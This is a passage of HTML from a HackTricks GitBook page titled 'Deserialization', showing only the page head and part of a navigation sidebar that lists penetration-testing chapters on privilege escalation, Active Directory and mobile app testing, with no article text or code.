
<!DOCTYPE HTML>
<html lang="" >
    <head>
        <meta charset="UTF-8">
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <title>Deserialization Â· GitBook</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="description" content="">
        <meta name="generator" content="GitBook 3.2.3">
        
        
        
    
    <link rel="stylesheet" href="../../gitbook/style.css">

    
            
                
                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-highlight/website.css">
                
            
                
                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-search/search.css">
                
            
                
                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-fontsettings/website.css">
                
            
        

    

    
        
    
        
    
        
    
        
    
        
    
        
    

        
    
    
    <meta name="HandheldFriendly" content="true"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../gitbook/images/apple-touch-icon-precomposed-152.png">
    <link rel="shortcut icon" href="../../gitbook/images/favicon.ico" type="image/x-icon">

    
    <link rel="next" href="nodejs-deserialization-__proto__-abuse.html" />
    
    
    <link rel="prev" href="../dangling-markup-html-scriptless-injection.html" />
    

    </head>
    <body>
        
<div class="book">
    <div class="book-summary">
        
            
<div id="book-search-input" role="search">
    <input type="text" placeholder="Type to search" />
</div>

            
                <nav role="navigation">
                


<ul class="summary">
    
    

    

    
        
        
    
        <li class="chapter " data-level="1.1" data-path="../../">
            
                <a href="../../">
            
                    
                    HackTricks
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2" data-path="../../general/pentesting-methodology.html">
            
                <a href="../../general/pentesting-methodology.html">
            
                    
                    Pentesting Methodology
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3" data-path="../../general/external-recon-methodology.html">
            
                <a href="../../general/external-recon-methodology.html">
            
                    
                    External Recon Methodology
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4" data-path="../../general/about-the-author.html">
            
                <a href="../../general/about-the-author.html">
            
                    
                    About the author
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5" data-path="../../general/exfiltration.html">
            
                <a href="../../general/exfiltration.html">
            
                    
                    Exfiltration
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.6" data-path="../../general/tunneling-and-port-forwarding.html">
            
                <a href="../../general/tunneling-and-port-forwarding.html">
            
                    
                    Tunneling and Port Forwarding
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.7" data-path="../../general/brute-force.html">
            
                <a href="../../general/brute-force.html">
            
                    
                    Brute Force - CheatSheet
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.8" data-path="../../general/search-exploits.html">
            
                <a href="../../general/search-exploits.html">
            
                    
                    Search Exploits
            
                </a>
            

            
        </li>
    

    
        
        <li class="header">Shells</li>
        
        
    
        <li class="chapter " data-level="2.1" data-path="../../shells/shells/">
            
                <a href="../../shells/shells/">
            
                    
                    Shells (Linux, Windows, MSFVenom)
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.1.1" data-path="../../shells/shells/untitled.html">
            
                <a href="../../shells/shells/untitled.html">
            
                    
                    MSFVenom - CheatSheet
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.2" data-path="../../shells/shells/windows.html">
            
                <a href="../../shells/shells/windows.html">
            
                    
                    Shells - Windows
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.3" data-path="../../shells/shells/linux.html">
            
                <a href="../../shells/shells/linux.html">
            
                    
                    Shells - Linux
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.4" data-path="../../shells/shells/full-ttys.html">
            
                <a href="../../shells/shells/full-ttys.html">
            
                    
                    Full TTYs
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    
        
        <li class="header">Linux/Unix</li>
        
        
    
        <li class="chapter " data-level="3.1" data-path="../../linux-unix/linux-privilege-escalation-checklist.html">
            
                <a href="../../linux-unix/linux-privilege-escalation-checklist.html">
            
                    
                    Checklist - Linux Privilege Escalation
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.2" data-path="../../linux-unix/privilege-escalation/">
            
                <a href="../../linux-unix/privilege-escalation/">
            
                    
                    Linux Privilege Escalation
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="3.2.1" data-path="../../linux-unix/privilege-escalation/electron-cef-chromium-debugger-abuse.html">
            
                <a href="../../linux-unix/privilege-escalation/electron-cef-chromium-debugger-abuse.html">
            
                    
                    electron/CEF/chromium debugger abuse
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.2.2" data-path="../../linux-unix/privilege-escalation/escaping-from-a-docker-container.html">
            
                <a href="../../linux-unix/privilege-escalation/escaping-from-a-docker-container.html">
            
                    
                    Escaping from a Docker container
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.2.3" data-path="../../linux-unix/privilege-escalation/escaping-from-limited-bash.html">
            
                <a href="../../linux-unix/privilege-escalation/escaping-from-limited-bash.html">
            
                    
                    Escaping from restricted shells - Jails
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.2.4" data-path="../../linux-unix/privilege-escalation/cisco-vmanage.html">
            
                <a href="../../linux-unix/privilege-escalation/cisco-vmanage.html">
            
                    
                    Cisco - vmanage
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.2.5" data-path="../../linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation.html">
            
                <a href="../../linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation.html">
            
                    
                    D-Bus Enumeration & Command Injection Privilege Escalation
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.2.6" data-path="../../linux-unix/privilege-escalation/interesting-groups-linux-pe/">
            
                <a href="../../linux-unix/privilege-escalation/interesting-groups-linux-pe/">
            
                    
                    Interesting Groups - Linux PE
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="3.2.6.1" data-path="../../linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation.html">
            
                <a href="../../linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation.html">
            
                    
                    lxd/lxc Group - Privilege escalation
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="3.2.7" data-path="../../linux-unix/privilege-escalation/ld.so.conf-example.html">
            
                <a href="../../linux-unix/privilege-escalation/ld.so.conf-example.html">
            
                    
                    ld.so exploit example
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.2.8" data-path="../../linux-unix/privilege-escalation/linux-capabilities.html">
            
                <a href="../../linux-unix/privilege-escalation/linux-capabilities.html">
            
                    
                    Linux Capabilities
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.2.9" data-path="../../linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe.html">
            
                <a href="../../linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe.html">
            
                    
                    NFS no_root_squash/no_all_squash misconfiguration PE
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.2.10" data-path="../../linux-unix/privilege-escalation/ssh-forward-agent-exploitation.html">
            
                <a href="../../linux-unix/privilege-escalation/ssh-forward-agent-exploitation.html">
            
                    
                    SSH Forward Agent exploitation
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.2.11" data-path="../../linux-unix/privilege-escalation/socket-command-injection.html">
            
                <a href="../../linux-unix/privilege-escalation/socket-command-injection.html">
            
                    
                    Socket Command Injection
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.2.12" data-path="../../linux-unix/privilege-escalation/payloads-to-execute.html">
            
                <a href="../../linux-unix/privilege-escalation/payloads-to-execute.html">
            
                    
                    Payloads to execute
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.2.13" data-path="../../linux-unix/privilege-escalation/wildcards-spare-tricks.html">
            
                <a href="../../linux-unix/privilege-escalation/wildcards-spare-tricks.html">
            
                    
                    Wildcards Spare tricks
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="3.3" data-path="../../linux-unix/useful-linux-commands/">
            
                <a href="../../linux-unix/useful-linux-commands/">
            
                    
                    Useful Linux Commands
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="3.3.1" data-path="../../linux-unix/useful-linux-commands/bypass-bash-restrictions.html">
            
                <a href="../../linux-unix/useful-linux-commands/bypass-bash-restrictions.html">
            
                    
                    Bypass Bash Restrictions
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="3.4" data-path="../../linux-unix/linux-environment-variables.html">
            
                <a href="../../linux-unix/linux-environment-variables.html">
            
                    
                    Linux Environment Variables
            
                </a>
            

            
        </li>
    

    
        
        <li class="header">Windows</li>
        
        
    
        <li class="chapter " data-level="4.1" data-path="../../windows/checklist-windows-privilege-escalation.html">
            
                <a href="../../windows/checklist-windows-privilege-escalation.html">
            
                    
                    Checklist - Local Windows Privilege Escalation
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2" data-path="../../windows/windows-local-privilege-escalation/">
            
                <a href="../../windows/windows-local-privilege-escalation/">
            
                    
                    Windows Local Privilege Escalation
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="4.2.1" data-path="../../windows/windows-local-privilege-escalation/dpapi-extracting-passwords.html">
            
                <a href="../../windows/windows-local-privilege-escalation/dpapi-extracting-passwords.html">
            
                    
                    DPAPI - Extracting Passwords
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2.2" data-path="../../windows/windows-local-privilege-escalation/seimpersonate-from-high-to-system.html">
            
                <a href="../../windows/windows-local-privilege-escalation/seimpersonate-from-high-to-system.html">
            
                    
                    SeImpersonate from High To System
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2.3" data-path="../../windows/windows-local-privilege-escalation/access-tokens.html">
            
                <a href="../../windows/windows-local-privilege-escalation/access-tokens.html">
            
                    
                    Access Tokens
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2.4" data-path="../../windows/windows-local-privilege-escalation/acls-dacls-sacls-aces.html">
            
                <a href="../../windows/windows-local-privilege-escalation/acls-dacls-sacls-aces.html">
            
                    
                    ACLs - DACLs/SACLs/ACEs
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2.5" data-path="../../windows/windows-local-privilege-escalation/dll-hijacking.html">
            
                <a href="../../windows/windows-local-privilege-escalation/dll-hijacking.html">
            
                    
                    Dll Hijacking
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2.6" data-path="../../windows/windows-local-privilege-escalation/from-high-integrity-to-system-with-name-pipes.html">
            
                <a href="../../windows/windows-local-privilege-escalation/from-high-integrity-to-system-with-name-pipes.html">
            
                    
                    From High Integrity to SYSTEM with Name Pipes
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2.7" data-path="../../windows/windows-local-privilege-escalation/integrity-levels.html">
            
                <a href="../../windows/windows-local-privilege-escalation/integrity-levels.html">
            
                    
                    Integrity Levels
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2.8" data-path="../../windows/windows-local-privilege-escalation/jaws.html">
            
                <a href="../../windows/windows-local-privilege-escalation/jaws.html">
            
                    
                    JAWS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2.9" data-path="../../windows/windows-local-privilege-escalation/juicypotato.html">
            
                <a href="../../windows/windows-local-privilege-escalation/juicypotato.html">
            
                    
                    JuicyPotato
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2.10" data-path="../../windows/windows-local-privilege-escalation/leaked-handle-exploitation.html">
            
                <a href="../../windows/windows-local-privilege-escalation/leaked-handle-exploitation.html">
            
                    
                    Leaked Handle Exploitation
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2.11" data-path="../../windows/windows-local-privilege-escalation/msi-wrapper.html">
            
                <a href="../../windows/windows-local-privilege-escalation/msi-wrapper.html">
            
                    
                    MSI Wrapper
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2.12" data-path="../../windows/windows-local-privilege-escalation/named-pipe-client-impersonation.html">
            
                <a href="../../windows/windows-local-privilege-escalation/named-pipe-client-impersonation.html">
            
                    
                    Named Pipe Client Impersonation
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2.13" data-path="../../windows/windows-local-privilege-escalation/powerup.html">
            
                <a href="../../windows/windows-local-privilege-escalation/powerup.html">
            
                    
                    PowerUp
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2.14" data-path="../../windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html">
            
                <a href="../../windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html">
            
                    
                    Privilege Escalation Abusing Tokens
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2.15" data-path="../../windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html">
            
                <a href="../../windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html">
            
                    
                    Privilege Escalation with Autoruns
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2.16" data-path="../../windows/windows-local-privilege-escalation/rottenpotato.html">
            
                <a href="../../windows/windows-local-privilege-escalation/rottenpotato.html">
            
                    
                    RottenPotato
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2.17" data-path="../../windows/windows-local-privilege-escalation/seatbelt.html">
            
                <a href="../../windows/windows-local-privilege-escalation/seatbelt.html">
            
                    
                    Seatbelt
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2.18" data-path="../../windows/windows-local-privilege-escalation/sedebug-+-seimpersonate-copy-token.html">
            
                <a href="../../windows/windows-local-privilege-escalation/sedebug-+-seimpersonate-copy-token.html">
            
                    
                    SeDebug + SeImpersonate copy token
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2.19" data-path="../../windows/windows-local-privilege-escalation/windows-c-payloads.html">
            
                <a href="../../windows/windows-local-privilege-escalation/windows-c-payloads.html">
            
                    
                    Windows C Payloads
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="4.3" data-path="../../windows/active-directory-methodology/">
            
                <a href="../../windows/active-directory-methodology/">
            
                    
                    Active Directory Methodology
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="4.3.1" data-path="../../windows/active-directory-methodology/acl-persistence-abuse.html">
            
                <a href="../../windows/active-directory-methodology/acl-persistence-abuse.html">
            
                    
                    Abusing Active Directory ACLs/ACEs
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.3.2" data-path="../../windows/active-directory-methodology/ad-information-in-printers.html">
            
                <a href="../../windows/active-directory-methodology/ad-information-in-printers.html">
            
                    
                    AD information in printers
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.3.3" data-path="../../windows/active-directory-methodology/asreproast.html">
            
                <a href="../../windows/active-directory-methodology/asreproast.html">
            
                    
                    ASREPRoast
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.3.4" data-path="../../windows/active-directory-methodology/bloodhound.html">
            
                <a href="../../windows/active-directory-methodology/bloodhound.html">
            
                    
                    BloodHound
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.3.5" data-path="../../windows/active-directory-methodology/constrained-delegation.html">
            
                <a href="../../windows/active-directory-methodology/constrained-delegation.html">
            
                    
                    Constrained Delegation
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.3.6" data-path="../../windows/active-directory-methodology/custom-ssp.html">
            
                <a href="../../windows/active-directory-methodology/custom-ssp.html">
            
                    
                    Custom SSP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.3.7" data-path="../../windows/active-directory-methodology/dcshadow.html">
            
                <a href="../../windows/active-directory-methodology/dcshadow.html">
            
                    
                    DCShadow
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.3.8" data-path="../../windows/active-directory-methodology/dcsync.html">
            
                <a href="../../windows/active-directory-methodology/dcsync.html">
            
                    
                    DCSync
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.3.9" data-path="../../windows/active-directory-methodology/dsrm-credentials.html">
            
                <a href="../../windows/active-directory-methodology/dsrm-credentials.html">
            
                    
                    DSRM Credentials
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.3.10" data-path="../../windows/active-directory-methodology/golden-ticket.html">
            
                <a href="../../windows/active-directory-methodology/golden-ticket.html">
            
                    
                    Golden Ticket
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.3.11" data-path="../../windows/active-directory-methodology/kerberos-authentication.html">
            
                <a href="../../windows/active-directory-methodology/kerberos-authentication.html">
            
                    
                    Kerberos Authentication
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.3.12" data-path="../../windows/active-directory-methodology/kerberoast.html">
            
                <a href="../../windows/active-directory-methodology/kerberoast.html">
            
                    
                    Kerberoast
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.3.13" data-path="../../windows/active-directory-methodology/mssql-trusted-links.html">
            
                <a href="../../windows/active-directory-methodology/mssql-trusted-links.html">
            
                    
                    MSSQL Trusted Links
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.3.14" data-path="../../windows/active-directory-methodology/over-pass-the-hash-pass-the-key.html">
            
                <a href="../../windows/active-directory-methodology/over-pass-the-hash-pass-the-key.html">
            
                    
                    Over Pass the Hash/Pass the Key
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.3.15" data-path="../../windows/active-directory-methodology/pass-the-ticket.html">
            
                <a href="../../windows/active-directory-methodology/pass-the-ticket.html">
            
                    
                    Pass the Ticket
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.3.16" data-path="../../windows/active-directory-methodology/password-spraying.html">
            
                <a href="../../windows/active-directory-methodology/password-spraying.html">
            
                    
                    Password Spraying
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.3.17" data-path="../../windows/active-directory-methodology/printers-spooler-service-abuse.html">
            
                <a href="../../windows/active-directory-methodology/printers-spooler-service-abuse.html">
            
                    
                    Printers Spooler Service abuse
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.3.18" data-path="../../windows/active-directory-methodology/privileged-accounts-and-token-privileges.html">
            
                <a href="../../windows/active-directory-methodology/privileged-accounts-and-token-privileges.html">
            
                    
                    Privileged Accounts and Token Privileges
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.3.19" data-path="../../windows/active-directory-methodology/resource-based-constrained-delegation.html">
            
                <a href="../../windows/active-directory-methodology/resource-based-constrained-delegation.html">
            
                    
                    Resource-based Constrained Delegation
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.3.20" data-path="../../windows/active-directory-methodology/security-descriptors.html">
            
                <a href="../../windows/active-directory-methodology/security-descriptors.html">
            
                    
                    Security Descriptors
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.3.21" data-path="../../windows/active-directory-methodology/silver-ticket.html">
            
                <a href="../../windows/active-directory-methodology/silver-ticket.html">
            
                    
                    Silver Ticket
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.3.22" data-path="../../windows/active-directory-methodology/skeleton-key.html">
            
                <a href="../../windows/active-directory-methodology/skeleton-key.html">
            
                    
                    Skeleton Key
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.3.23" data-path="../../windows/active-directory-methodology/unconstrained-delegation.html">
            
                <a href="../../windows/active-directory-methodology/unconstrained-delegation.html">
            
                    
                    Unconstrained Delegation
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="4.4" data-path="../../windows/ntlm/">
            
                <a href="../../windows/ntlm/">
            
                    
                    NTLM
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="4.4.1" data-path="../../windows/ntlm/places-to-steal-ntlm-creds.html">
            
                <a href="../../windows/ntlm/places-to-steal-ntlm-creds.html">
            
                    
                    Places to steal NTLM creds
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.4.2" data-path="../../windows/ntlm/psexec-and-winexec.html">
            
                <a href="../../windows/ntlm/psexec-and-winexec.html">
            
                    
                    PsExec/Winexec/ScExec
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.4.3" data-path="../../windows/ntlm/smbexec.html">
            
                <a href="../../windows/ntlm/smbexec.html">
            
                    
                    SmbExec/ScExec
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.4.4" data-path="../../windows/ntlm/wmicexec.html">
            
                <a href="../../windows/ntlm/wmicexec.html">
            
                    
                    WmicExec
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.4.5" data-path="../../windows/ntlm/atexec.html">
            
                <a href="../../windows/ntlm/atexec.html">
            
                    
                    AtExec / SchtasksExec
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.4.6" data-path="../../windows/ntlm/winrm.html">
            
                <a href="../../windows/ntlm/winrm.html">
            
                    
                    WinRM
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="4.5" data-path="../../windows/stealing-credentials/">
            
                <a href="../../windows/stealing-credentials/">
            
                    
                    Stealing Credentials
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="4.5.1" data-path="../../windows/stealing-credentials/credentials-protections.html">
            
                <a href="../../windows/stealing-credentials/credentials-protections.html">
            
                    
                    Credentials Protections
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.5.2" data-path="../../windows/stealing-credentials/credentials-mimikatz.html">
            
                <a href="../../windows/stealing-credentials/credentials-mimikatz.html">
            
                    
                    Mimikatz
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="4.6" data-path="../../windows/authentication-credentials-uac-and-efs.html">
            
                <a href="../../windows/authentication-credentials-uac-and-efs.html">
            
                    
                    Authentication, Credentials, UAC and EFS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.7" data-path="../../windows/basic-cmd-for-pentesters.html">
            
                <a href="../../windows/basic-cmd-for-pentesters.html">
            
                    
                    Basic CMD for Pentesters
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.8" data-path="../../windows/basic-powershell-for-pentesters/">
            
                <a href="../../windows/basic-powershell-for-pentesters/">
            
                    
                    Basic PowerShell for Pentesters
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="4.8.1" data-path="../../windows/basic-powershell-for-pentesters/powerview.html">
            
                <a href="../../windows/basic-powershell-for-pentesters/powerview.html">
            
                    
                    PowerView
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="4.9" data-path="../../windows/av-bypass.html">
            
                <a href="../../windows/av-bypass.html">
            
                    
                    AV Bypass
            
                </a>
            

            
        </li>
    

    
        
        <li class="header">Mobile Apps Pentesting</li>
        
        
    
        <li class="chapter " data-level="5.1" data-path="../../mobile-apps-pentesting/android-checklist.md">
            
                <span>
            
                    
                    Android APK Checklist
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.2" data-path="../../mobile-apps-pentesting/android-app-pentesting/">
            
                <a href="../../mobile-apps-pentesting/android-app-pentesting/">
            
                    
                    Android Applications Pentesting
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="5.2.1" data-path="../../mobile-apps-pentesting/android-app-pentesting/adb-commands.html">
            
                <a href="../../mobile-apps-pentesting/android-app-pentesting/adb-commands.html">
            
                    
                    ADB Commands
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.2.2" data-path="../../mobile-apps-pentesting/android-app-pentesting/apk-decompilers.html">
            
                <a href="../../mobile-apps-pentesting/android-app-pentesting/apk-decompilers.html">
            
                    
                    APK decompilers
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.2.3" data-path="../../mobile-apps-pentesting/android-app-pentesting/avd-android-virtual-device.html">
            
                <a href="../../mobile-apps-pentesting/android-app-pentesting/avd-android-virtual-device.html">
            
                    
                    AVD - Android Virtual Device
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.2.4" data-path="../../mobile-apps-pentesting/android-app-pentesting/android-burp-suite-settings.html">
            
                <a href="../../mobile-apps-pentesting/android-app-pentesting/android-burp-suite-settings.html">
            
                    
                    Burp Suite Configuration for Android
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.2.5" data-path="../../mobile-apps-pentesting/android-app-pentesting/drozer-tutorial/">
            
                <a href="../../mobile-apps-pentesting/android-app-pentesting/drozer-tutorial/">
            
                    
                    Drozer Tutorial
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="5.2.5.1" data-path="../../mobile-apps-pentesting/android-app-pentesting/drozer-tutorial/exploiting-content-providers.html">
            
                <a href="../../mobile-apps-pentesting/android-app-pentesting/drozer-tutorial/exploiting-content-providers.html">
            
                    
                    Exploiting Content Providers
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="5.2.6" data-path="../../mobile-apps-pentesting/android-app-pentesting/exploiting-a-debuggeable-applciation.html">
            
                <a href="../../mobile-apps-pentesting/android-app-pentesting/exploiting-a-debuggeable-applciation.html">
            
                    
                    Exploiting a debuggeable applciation
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.2.7" data-path="../../mobile-apps-pentesting/android-app-pentesting/frida-tutorial/">
            
                <a href="../../mobile-apps-pentesting/android-app-pentesting/frida-tutorial/">
            
                    
                    Frida Tutorial
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="5.2.7.1" data-path="../../mobile-apps-pentesting/android-app-pentesting/frida-tutorial/frida-tutorial-1.html">
            
                <a href="../../mobile-apps-pentesting/android-app-pentesting/frida-tutorial/frida-tutorial-1.html">
            
                    
                    Frida Tutorial 1
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.2.7.2" data-path="../../mobile-apps-pentesting/android-app-pentesting/frida-tutorial/frida-tutorial-2.html">
            
                <a href="../../mobile-apps-pentesting/android-app-pentesting/frida-tutorial/frida-tutorial-2.html">
            
                    
                    Frida Tutorial 2
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.2.7.3" data-path="../../mobile-apps-pentesting/android-app-pentesting/frida-tutorial/owaspuncrackable-1.html">
            
                <a href="../../mobile-apps-pentesting/android-app-pentesting/frida-tutorial/owaspuncrackable-1.html">
            
                    
                    Frida Tutorial 3
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.2.7.4" data-path="../../mobile-apps-pentesting/android-app-pentesting/frida-tutorial/objection-tutorial.html">
            
                <a href="../../mobile-apps-pentesting/android-app-pentesting/frida-tutorial/objection-tutorial.html">
            
                    
                    Objection Tutorial
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="5.2.8" data-path="../../mobile-apps-pentesting/android-app-pentesting/google-ctf-2018-shall-we-play-a-game.html">
            
                <a href="../../mobile-apps-pentesting/android-app-pentesting/google-ctf-2018-shall-we-play-a-game.html">
            
                    
                    Google CTF 2018 - Shall We Play a Game?
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.2.9" data-path="../../mobile-apps-pentesting/android-app-pentesting/make-apk-accept-ca-certificate.html">
            
                <a href="../../mobile-apps-pentesting/android-app-pentesting/make-apk-accept-ca-certificate.html">
            
                    
                    Make APK Accept CA Certificate
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.2.10" data-path="../../mobile-apps-pentesting/android-app-pentesting/manual-deobfuscation.html">
            
                <a href="../../mobile-apps-pentesting/android-app-pentesting/manual-deobfuscation.html">
            
                    
                    Manual DeObfuscation
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.2.11" data-path="../../mobile-apps-pentesting/android-app-pentesting/reversing-native-libraries.html">
            
                <a href="../../mobile-apps-pentesting/android-app-pentesting/reversing-native-libraries.html">
            
                    
                    Reversing Native Libraries
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.2.12" data-path="../../mobile-apps-pentesting/android-app-pentesting/smali-changes.html">
            
                <a href="../../mobile-apps-pentesting/android-app-pentesting/smali-changes.html">
            
                    
                    Smali - Decompiling/[Modifying]/Compiling
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.2.13" data-path="../../mobile-apps-pentesting/android-app-pentesting/spoofing-your-location-in-play-store.html">
            
                <a href="../../mobile-apps-pentesting/android-app-pentesting/spoofing-your-location-in-play-store.html">
            
                    
                    Spoofing your location in Play Store
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.2.14" data-path="../../mobile-apps-pentesting/android-app-pentesting/webview-attacks.html">
            
                <a href="../../mobile-apps-pentesting/android-app-pentesting/webview-attacks.html">
            
                    
                    Webview Attacks
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.2.15" data-path="../../mobile-apps-pentesting/android-app-pentesting/what-are-intents.html">
            
                <a href="../../mobile-apps-pentesting/android-app-pentesting/what-are-intents.html">
            
                    
                    What are Intents
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    
        
        <li class="header">Pentesting</li>
        
        
    
        <li class="chapter " data-level="6.1" data-path="../../pentesting/pentesting-network/">
            
                <a href="../../pentesting/pentesting-network/">
            
                    
                    Pentesting Network
            
                </a>
            
